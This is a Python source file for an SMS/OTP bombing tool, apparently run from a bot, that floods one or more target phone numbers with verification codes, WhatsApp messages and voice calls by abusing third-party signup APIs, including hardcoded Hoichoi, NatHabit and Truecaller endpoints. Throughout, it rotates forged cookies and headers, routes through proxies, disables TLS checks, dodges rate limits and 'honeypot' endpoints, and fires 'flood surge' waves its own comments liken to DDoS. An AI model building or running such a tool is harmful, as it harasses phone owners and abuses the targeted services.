from __future__ import annotations

import asyncio
import copy
import time
import random
import string
import uuid
import re
from typing import Dict, List, Optional, Callable, Set

import aiohttp
from aiohttp import TCPConnector
from aiohttp_socks import ProxyConnector

from helpers import replacePlaceholders, injectRotatedHeaders


# ---------------------------------------------------------------------------
# OTP / WhatsApp / Voice detection
# ---------------------------------------------------------------------------

OTP_KEYWORDS = [
    "otp sent", "otp has been sent", "verification code sent",
    "sent successfully", "sms sent", "message sent",
    "\"success\":true", "\"status\":\"success\"", "\"status\":\"ok\"",
    "\"result\":true", "successfully sent", "send otp", "otp generated",
    "message delivered", "sms delivered", "code sent", "verification sent",
    "whatsapp", "wp otp", "sent to whatsapp",
    "call initiated", "call placed", "calling", "voice call", "ivr",
]

# Honeypot fingerprints — fake success responses that do nothing
HONEYPOT_FINGERPRINTS = [
    # Generic fake success with no real content
    r'"status"\s*:\s*"ok"\s*}$',           # just {"status":"ok"} with nothing else
    r'"message"\s*:\s*"success"\s*}$',     # just {"message":"success"}
    r'^\s*\{\s*"code"\s*:\s*0\s*\}\s*$',  # just {"code":0}
    r'^\s*\{\s*\}\s*$',                    # empty object
    r'^\s*true\s*$',                       # just "true"
    r'^\s*1\s*$',                          # just "1"
    r'^\s*ok\s*$',                         # just "ok"
]

HONEYPOT_PATTERNS = [re.compile(p, re.IGNORECASE) for p in HONEYPOT_FINGERPRINTS]

# Track which APIs are honeypots per session
_honeypotApis: Set[str] = set()
_honeypotCounts: Dict[str, int] = {}   # name -> consecutive fake success count
HONEYPOT_THRESHOLD = 5  # mark as honeypot after N identical responses


def isConfirmedOtp(status: int, text: str) -> bool:
    if status not in (200, 201, 202):
        return False
    return any(k in text.lower() for k in OTP_KEYWORDS)


def is2xx(status: int) -> bool:
    return 200 <= status < 300


def isHoneypot(name: str, text: str) -> bool:
    """Detect if this API is returning fake success responses."""
    if name in _honeypotApis:
        return True
    stripped = text.strip()
    for pattern in HONEYPOT_PATTERNS:
        if pattern.search(stripped):
            _honeypotCounts[name] = _honeypotCounts.get(name, 0) + 1
            if _honeypotCounts[name] >= HONEYPOT_THRESHOLD:
                _honeypotApis.add(name)
            return True
    # Reset count if response looks real
    _honeypotCounts[name] = 0
    return False


# ---------------------------------------------------------------------------
# Phone format variants
# ---------------------------------------------------------------------------

def getPhoneVariants(phone: str) -> List[str]:
    return [
        phone,
        f"91{phone}",
        f"+91{phone}",
        f"0{phone}",
    ]


# ---------------------------------------------------------------------------
# Cookie rotation
# ---------------------------------------------------------------------------

def generateRandomCookies() -> dict:
    return {
        "session_id": "".join(random.choices(string.ascii_lowercase + string.digits, k=32)),
        "device_id":  str(uuid.uuid4()),
        "visitor_id": str(uuid.uuid4()).replace("-", ""),
        "_ga":        f"GA1.2.{random.randint(100000000, 999999999)}.{int(time.time())}",
        "csrf_token": "".join(random.choices(string.ascii_letters + string.digits, k=40)),
    }


def injectRotatedCookies(existing: Optional[dict]) -> dict:
    fresh = generateRandomCookies()
    if existing:
        fresh.update(existing)
    return fresh


# ---------------------------------------------------------------------------
# Per-API state
# ---------------------------------------------------------------------------

class ApiState:
    ACTIVE      = "active"
    RATELIMITED = "ratelimited"
    DEAD        = "dead"
    HONEYPOT    = "honeypot"

    MIN_CONCURRENCY = 2
    MAX_CONCURRENCY = 128

    def __init__(self, name: str, baseConcurrency: int):
        self.name           = name
        self.status         = self.ACTIVE
        self.cooldownUntil  = 0.0
        self.errorStreak    = 0
        self.rlCount        = 0
        self.requests       = 0
        self.confirmed      = 0
        self.responses2xx   = 0
        self.rateLimits     = 0
        self.errors         = 0
        self.totalLatencyMs = 0.0
        self.latencyCount   = 0
        self.concurrency    = baseConcurrency
        self._successWindow = 0
        self._errorWindow   = 0
        self._windowSize    = 20

    def isAvailable(self) -> bool:
        # Skip honeypots — they're fake
        if self.status == self.HONEYPOT:
            return False
        return True

    def recordLatency(self, latencySeconds: float) -> None:
        self.totalLatencyMs += latencySeconds * 1000
        self.latencyCount   += 1

    def avgMs(self) -> int:
        if self.latencyCount == 0:
            return 0
        return int(self.totalLatencyMs / self.latencyCount)

    def adaptConcurrency(self, success: bool) -> None:
        if success:
            self._successWindow += 1
        else:
            self._errorWindow += 1
        total = self._successWindow + self._errorWindow
        if total < self._windowSize:
            return
        rate = self._successWindow / total
        if rate >= 0.7:
            self.concurrency = min(self.concurrency + 4, self.MAX_CONCURRENCY)
        elif rate <= 0.3:
            self.concurrency = max(self.concurrency - 1, self.MIN_CONCURRENCY)
        self._successWindow = 0
        self._errorWindow   = 0


# ---------------------------------------------------------------------------
# Stats
# ---------------------------------------------------------------------------

class Stats:
    def __init__(self, apiNames: List[str], baseConcurrency: int) -> None:
        self.startTime   = time.time()
        self.totalReqs   = 0
        self.confirmed   = 0
        self.responses   = 0
        self.errors      = 0
        self.surgeCount  = 0   # how many flood surges fired
        self.lastOtpApi  = ""
        self.apiStates: Dict[str, ApiState] = {
            n: ApiState(n, baseConcurrency) for n in apiNames
        }
        self.onOtpConfirmed: Optional[Callable] = None

    def elapsed(self) -> float:
        return time.time() - self.startTime

    def rps(self) -> float:
        e = self.elapsed()
        return round(self.totalReqs / e, 1) if e > 0 else 0.0

    def recordSuccess(self, name: str, latency: float, confirmed: bool) -> None:
        self.totalReqs += 1
        self.responses += 1
        s = self.apiStates.get(name)
        if s:
            s.requests     += 1
            s.responses2xx += 1
            s.errorStreak   = 0
            s.recordLatency(latency)
            s.adaptConcurrency(True)
            if confirmed:
                s.confirmed    += 1
                self.confirmed += 1
                self.lastOtpApi = name

    def recordRateLimit(self, name: str) -> None:
        self.totalReqs += 1
        s = self.apiStates.get(name)
        if s:
            s.requests   += 1
            s.rateLimits += 1
            s.rlCount    += 1

    def recordError(self, name: str) -> None:
        self.totalReqs += 1
        self.errors    += 1
        s = self.apiStates.get(name)
        if s:
            s.requests    += 1
            s.errors      += 1
            s.errorStreak += 1
            s.adaptConcurrency(False)

    def markHoneypot(self, name: str) -> None:
        s = self.apiStates.get(name)
        if s:
            s.status = ApiState.HONEYPOT

    def snapshot(self) -> dict:
        perApi = {}
        for name, s in self.apiStates.items():
            perApi[name] = {
                "requests":    s.requests,
                "confirmed":   s.confirmed,
                "responses":   s.responses2xx,
                "errors":      s.errors,
                "ratelimits":  s.rateLimits,
                "avgMs":       s.avgMs(),
                "status":      s.status,
                "concurrency": s.concurrency,
            }
        return {
            "totalReqs":  self.totalReqs,
            "confirmed":  self.confirmed,
            "responses":  self.responses,
            "errors":     self.errors,
            "surgeCount": self.surgeCount,
            "elapsed":    round(self.elapsed(), 1),
            "rps":        self.rps(),
            "perApi":     perApi,
            "total":      self.totalReqs,
            "otpSent":    self.confirmed,
        }


# ---------------------------------------------------------------------------
# Type coercion
# ---------------------------------------------------------------------------

def coerceTypes(obj, original):
    if isinstance(original, dict) and isinstance(obj, dict):
        return {k: coerceTypes(obj.get(k, v), v) for k, v in original.items()}
    if isinstance(original, list) and isinstance(obj, list):
        return [coerceTypes(o, p) for o, p in zip(obj, original)]
    if isinstance(original, int) and isinstance(obj, str):
        try: return int(obj)
        except (ValueError, TypeError): return obj
    if isinstance(original, float) and isinstance(obj, str):
        try: return float(obj)
        except (ValueError, TypeError): return obj
    return obj


# ---------------------------------------------------------------------------
# Shared keep-alive connector pool
# ---------------------------------------------------------------------------

_connectorPool: Dict[str, TCPConnector] = {}

def getConnector(proxy: Optional[str]) -> aiohttp.BaseConnector:
    if proxy:
        return ProxyConnector.from_url(proxy, limit=200, ssl=False, enable_cleanup_closed=True)
    key = "default"
    if key not in _connectorPool or _connectorPool[key].closed:
        _connectorPool[key] = TCPConnector(
            limit=0,
            limit_per_host=100,
            ttl_dns_cache=600,
            ssl=False,
            keepalive_timeout=60,
            force_close=False,
            enable_cleanup_closed=True,
        )
    return _connectorPool[key]


# ---------------------------------------------------------------------------
# Single API call — honeypot detection + rotation + jitter + retry
# ---------------------------------------------------------------------------

async def callApi(
    session: aiohttp.ClientSession,
    api: dict,
    phone: str,
    stats: Stats,
    stopEvent: asyncio.Event,
    retry: bool = True,
    phoneVariant: Optional[str] = None,
    jitter: bool = True,
) -> bool:
    name = api["name"]
    if stopEvent.is_set():
        return False

    # Skip known honeypots immediately
    s = stats.apiStates.get(name)
    if s and s.status == ApiState.HONEYPOT:
        return False

    if jitter:
        await asyncio.sleep(random.uniform(0, 0.06))

    targetPhone = phoneVariant or phone

    try:
        cfg        = copy.deepcopy(api)
        rawHeaders = cfg.get("headers") or {}
        headers    = injectRotatedHeaders(replacePlaceholders(rawHeaders, targetPhone))
        params     = replacePlaceholders(cfg.get("params"), targetPhone)
        jsonData   = coerceTypes(replacePlaceholders(cfg.get("json"), targetPhone), api.get("json"))
        data       = replacePlaceholders(cfg.get("data"), targetPhone)
        rawCookies = replacePlaceholders(cfg.get("cookies"), targetPhone) or {}
        cookies    = injectRotatedCookies(rawCookies)
        url        = cfg["url"].replace("{phone}", targetPhone)

        t0 = time.time()
        async with session.request(
            cfg["method"], url,
            headers=headers, params=params,
            json=jsonData, data=data, cookies=cookies,
            timeout=aiohttp.ClientTimeout(total=6, connect=2),
            allow_redirects=True,
            ssl=False,
        ) as resp:
            latency = time.time() - t0
            text    = await resp.text()

            if resp.status == 429:
                stats.recordRateLimit(name)
                return False

            if is2xx(resp.status):
                # Honeypot check — is this a fake success?
                if isHoneypot(name, text):
                    stats.markHoneypot(name)
                    return False
                confirmed = isConfirmedOtp(resp.status, text)
                stats.recordSuccess(name, latency, confirmed)
                return True

            stats.recordError(name)
            if retry and not stopEvent.is_set():
                await callApi(session, api, phone, stats, stopEvent,
                              retry=False, phoneVariant=phoneVariant, jitter=False)
            return False

    except asyncio.TimeoutError:
        stats.recordError(name)
        return False
    except Exception:
        stats.recordError(name)
        return False


# ---------------------------------------------------------------------------
# Flood surge — fires 500 requests across all APIs simultaneously every 10s
# ---------------------------------------------------------------------------

async def floodSurge(
    apis: List[dict],
    phone: str,
    stats: Stats,
    stopEvent: asyncio.Event,
    proxy: Optional[str],
    surgeSize: int = 500,
    interval: float = 10.0,
) -> None:
    """
    Every `interval` seconds, fire `surgeSize` requests across all active APIs
    simultaneously — like a DDoS wave on top of normal traffic.
    """
    connector = getConnector(proxy)
    session   = aiohttp.ClientSession(connector=connector, connector_owner=False)

    try:
        while not stopEvent.is_set():
            # Wait for next surge
            try:
                await asyncio.wait_for(asyncio.shield(stopEvent.wait()), timeout=interval)
                break
            except asyncio.TimeoutError:
                pass

            if stopEvent.is_set():
                break

            # Fire surge — distribute across all non-honeypot APIs
            activeApis = [a for a in apis
                          if stats.apiStates.get(a["name"]) and
                          stats.apiStates[a["name"]].status != ApiState.HONEYPOT]

            if not activeApis:
                continue

            stats.surgeCount += 1
            tasks = []
            phoneVariants = getPhoneVariants(phone)

            for idx in range(surgeSize):
                api     = activeApis[idx % len(activeApis)]
                variant = phoneVariants[idx % len(phoneVariants)]
                task    = asyncio.create_task(
                    callApi(session, api, phone, stats, stopEvent,
                            phoneVariant=variant, jitter=False)
                )
                tasks.append(task)

            # Fire all at once
            await asyncio.gather(*tasks, return_exceptions=True)

    finally:
        await session.close()


# ---------------------------------------------------------------------------
# Per-API worker — burst + adaptive + flood + honeypot skip
# ---------------------------------------------------------------------------

async def apiWorker(
    api: dict,
    phone: str,
    stats: Stats,
    stopEvent: asyncio.Event,
    proxy: Optional[str],
    baseConcurrency: int,
    burstDuration: float = 15.0,
    burstMultiplier: int = 5,
) -> None:
    connector    = getConnector(proxy)
    ownConnector = proxy is not None
    session      = aiohttp.ClientSession(connector=connector, connector_owner=ownConnector)

    try:
        activeTasks:  set  = set()
        phoneVariants      = getPhoneVariants(phone)
        variantIdx         = 0
        floodBudget        = 0
        startTime          = time.time()

        while not stopEvent.is_set():
            state = stats.apiStates.get(api["name"])

            # Skip if marked honeypot
            if state and state.status == ApiState.HONEYPOT:
                break

            done        = {t for t in activeTasks if t.done()}
            activeTasks -= done

            for t in done:
                try:
                    if t.result():
                        floodBudget += 3
                except Exception:
                    pass

            elapsed = time.time() - startTime
            if elapsed < burstDuration:
                targetConcurrency = (state.concurrency if state else baseConcurrency) * burstMultiplier
            else:
                targetConcurrency = state.concurrency if state else baseConcurrency

            targetConcurrency = min(targetConcurrency, ApiState.MAX_CONCURRENCY)

            if floodBudget > 0 and len(activeTasks) < targetConcurrency + 20:
                variant = phoneVariants[variantIdx % len(phoneVariants)]
                variantIdx += 1
                task = asyncio.create_task(
                    callApi(session, api, phone, stats, stopEvent, phoneVariant=variant)
                )
                activeTasks.add(task)
                floodBudget -= 1
                continue

            if len(activeTasks) < targetConcurrency:
                variant = phoneVariants[variantIdx % len(phoneVariants)]
                variantIdx += 1
                task = asyncio.create_task(
                    callApi(session, api, phone, stats, stopEvent, phoneVariant=variant)
                )
                activeTasks.add(task)
            else:
                await asyncio.sleep(0)

        for t in activeTasks:
            t.cancel()
        if activeTasks:
            await asyncio.gather(*activeTasks, return_exceptions=True)

    finally:
        await session.close()


# ---------------------------------------------------------------------------
# WhatsApp + Voice call APIs (hardcoded — fires separately)
# ---------------------------------------------------------------------------

WHATSAPP_APIS = [
    {
        "name": "WA_Hoichoi",
        "method": "POST",
        "url": "https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code",
        "headers": {"content-type": "application/json"},
        "json": {"phoneNumber": "+91{phone}", "platform": "MOBILE_WEB", "channel": "WHATSAPP"},
    },
    {
        "name": "WA_NatHabit",
        "method": "POST",
        "url": "https://authorize.api.nathabit.in/v2/auth/v2/otp/",
        "headers": {"content-type": "application/json"},
        "json": {"phone": "{phone}", "send_on_whatsapp": True, "address_consent": True, "email": ""},
    },
]

VOICE_APIS = [
    {
        "name": "Voice_Truecaller",
        "method": "POST",
        "url": "https://asia-south1-truecaller-web.cloudfunctions.net/webapi/noneu/auth/truecaller/v1/send-otp",
        "headers": {"content-type": "application/json", "origin": "https://www.truecaller.com"},
        "json": {"phone": "91{phone}", "countryCode": "in", "otpType": "VOICE"},
    },
]


async def fireSpecialApis(
    apis: List[dict],
    phone: str,
    stats: Stats,
    stopEvent: asyncio.Event,
    interval: float = 15.0,
) -> None:
    """Fire WhatsApp and Voice APIs on a separate loop."""
    connector = getConnector(None)
    session   = aiohttp.ClientSession(connector=connector, connector_owner=False)

    # Add states for special APIs
    for api in apis:
        if api["name"] not in stats.apiStates:
            stats.apiStates[api["name"]] = ApiState(api["name"], 2)

    try:
        while not stopEvent.is_set():
            # Fire all special APIs
            tasks = [
                asyncio.create_task(
                    callApi(session, api, phone, stats, stopEvent, jitter=False)
                )
                for api in apis
            ]
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)

            # Wait before next round
            try:
                await asyncio.wait_for(asyncio.shield(stopEvent.wait()), timeout=interval)
                break
            except asyncio.TimeoutError:
                pass
    finally:
        await session.close()


# ---------------------------------------------------------------------------
# Single API test (admin)
# ---------------------------------------------------------------------------

async def testSingleApi(api: dict, phone: str) -> dict:
    try:
        cfg        = copy.deepcopy(api)
        rawHeaders = cfg.get("headers") or {}
        headers    = injectRotatedHeaders(replacePlaceholders(rawHeaders, phone))
        params     = replacePlaceholders(cfg.get("params"), phone)
        jsonData   = coerceTypes(replacePlaceholders(cfg.get("json"), phone), api.get("json"))
        data       = replacePlaceholders(cfg.get("data"), phone)
        cookies    = replacePlaceholders(cfg.get("cookies"), phone)
        url        = cfg["url"].replace("{phone}", phone)

        connector = TCPConnector(limit=10, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            t0 = time.time()
            async with session.request(
                cfg["method"], url,
                headers=headers, params=params,
                json=jsonData, data=data, cookies=cookies,
                timeout=aiohttp.ClientTimeout(total=15),
                allow_redirects=True,
            ) as resp:
                latency = round((time.time() - t0) * 1000)
                text    = await resp.text()
                return {"ok": True, "status": resp.status, "latencyMs": latency, "snippet": text[:300].strip()}
    except asyncio.TimeoutError:
        return {"ok": False, "error": "Timeout (>15s)"}
    except Exception as e:
        return {"ok": False, "error": (str(e).strip() or type(e).__name__)[:80]}


# ---------------------------------------------------------------------------
# Proxy helpers
# ---------------------------------------------------------------------------

async def checkProxy(proxy: str) -> Optional[str]:
    try:
        connector = ProxyConnector.from_url(proxy)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get("http://httpbin.org/ip", timeout=aiohttp.ClientTimeout(total=5)):
                return proxy
    except Exception:
        return None


async def validateProxies(proxyList: List[str]) -> List[str]:
    results = await asyncio.gather(*[checkProxy(p) for p in proxyList])
    return [p for p in results if p]


# ---------------------------------------------------------------------------
# Runner — everything combined
# ---------------------------------------------------------------------------

class TesterRunner:
    def __init__(
        self,
        phone: str,
        duration: int,
        workers: int,
        useProxy: bool,
        proxyList: Optional[List[str]] = None,
        userId: Optional[int] = None,
        bot=None,
        nukeMode: bool = False,
    ) -> None:
        raw        = [p.strip() for p in phone.replace("،", ",").split(",") if p.strip().isdigit()]
        self.phones    = raw if raw else [phone]
        self.phone     = self.phones[0]
        self.duration  = duration
        self.workers   = workers if not nukeMode else 64
        self.useProxy  = useProxy
        self._proxyList = proxyList or []
        self._userId   = userId
        self._bot      = bot
        self.nukeMode  = nukeMode

        from bot.services.api_manager import apiManager
        from bot.services.database import db
        self._apiConfigs = apiManager.getMergedConfigs()
        self._skipSet    = db.getSkippedApiNames()

        self.stats      = Stats([a["name"] for a in self._apiConfigs], self.workers)
        self._stopEvent = asyncio.Event()
        self._tasks: List[asyncio.Task] = []
        self._running   = False
        self._endTime   = 0.0

    @property
    def isRunning(self) -> bool:
        return self._running

    async def start(self) -> None:
        self._running  = True
        self._endTime  = time.time() + self.duration
        self._stopEvent.clear()

        # Reset honeypot tracking per session
        _honeypotApis.clear()
        _honeypotCounts.clear()

        self.stats = Stats([a["name"] for a in self._apiConfigs], self.workers)

        proxyList: List[str] = []
        if self.useProxy and self._proxyList:
            proxyList = await validateProxies(self._proxyList)

        activeApis = [a for a in self._apiConfigs if a["name"] not in self._skipSet]

        burstDuration   = 9999.0 if self.nukeMode else 15.0
        burstMultiplier = 10     if self.nukeMode else 5
        surgeSize       = 1000   if self.nukeMode else 500
        surgeInterval   = 5.0    if self.nukeMode else 10.0

        # One worker per API per phone target
        for phone in self.phones:
            for idx, api in enumerate(activeApis):
                proxy = proxyList[idx % len(proxyList)] if proxyList else None
                task  = asyncio.create_task(
                    apiWorker(
                        api=api,
                        phone=phone,
                        stats=self.stats,
                        stopEvent=self._stopEvent,
                        proxy=proxy,
                        baseConcurrency=self.workers,
                        burstDuration=burstDuration,
                        burstMultiplier=burstMultiplier,
                    ),
                    name=f"api_{phone}_{api['name']}"
                )
                self._tasks.append(task)

            # Flood surge task per phone
            surgeTask = asyncio.create_task(
                floodSurge(
                    apis=activeApis,
                    phone=phone,
                    stats=self.stats,
                    stopEvent=self._stopEvent,
                    proxy=proxyList[0] if proxyList else None,
                    surgeSize=surgeSize,
                    interval=surgeInterval,
                ),
                name=f"surge_{phone}"
            )
            self._tasks.append(surgeTask)

            # WhatsApp + Voice special APIs
            specialApis = WHATSAPP_APIS + VOICE_APIS
            specialTask = asyncio.create_task(
                fireSpecialApis(
                    apis=specialApis,
                    phone=phone,
                    stats=self.stats,
                    stopEvent=self._stopEvent,
                    interval=12.0,
                ),
                name=f"special_{phone}"
            )
            self._tasks.append(specialTask)

        timer    = asyncio.create_task(self._timer(),    name="timer")
        watchdog = asyncio.create_task(self._watchdog(), name="watchdog")
        self._tasks.extend([timer, watchdog])

    async def stop(self) -> None:
        self._stopEvent.set()
        for t in self._tasks:
            t.cancel()
        await asyncio.gather(*self._tasks, return_exceptions=True)
        self._tasks.clear()
        self._running = False

    async def _timer(self) -> None:
        delay = self._endTime - time.time()
        if delay > 0:
            await asyncio.sleep(delay)
        self._stopEvent.set()

    async def _watchdog(self) -> None:
        apiTasks = [t for t in self._tasks if t.get_name().startswith("api_")]
        if apiTasks:
            await asyncio.gather(*apiTasks, return_exceptions=True)
        self._running = False